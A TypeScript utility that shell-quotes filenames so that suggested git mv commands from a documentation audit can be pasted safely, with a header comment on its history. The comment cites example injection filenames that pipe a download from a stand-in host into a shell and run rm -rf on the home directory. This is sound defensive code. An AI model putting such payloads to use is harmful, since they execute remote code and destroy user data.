/**
 * shell-quote.ts — POSIX-safe shell quoting for audit `Suggested:` lines.
 *
 * Hoisted from doc-type.ts during Track 8A: the new doc-location.ts
 * `Suggested:` lines (post-codex review) need the same quoting semantics
 * that doc-type.ts already shipped. Both checks now import from here so
 * the audit has a single source of quoting truth.
 *
 * Defends against malicious filenames like `a;curl evil|sh.md` or
 * `$(rm -rf ~)` — when the user copy-pastes the suggestion, shell-meta
 * chars stay literal. Inside single quotes only the closing quote needs
 * escaping, via the classic `'\''` (close, escaped quote, reopen)
 * sequence. Combine this with a leading `--` end-of-options sentinel on
 * `git mv`/`mv` so leading-dash filenames are never interpreted as flags.
 *
 * Track 5A codex ship review caught the unquoted case as P0; Track 8A
 * codex review caught the duplicate-implementation risk when adding
 * doc-location's Suggested lines.
 */

export function shellQuote(s: string): string {
  return `'${s.replace(/'/g, "'\\''")}'`;
}
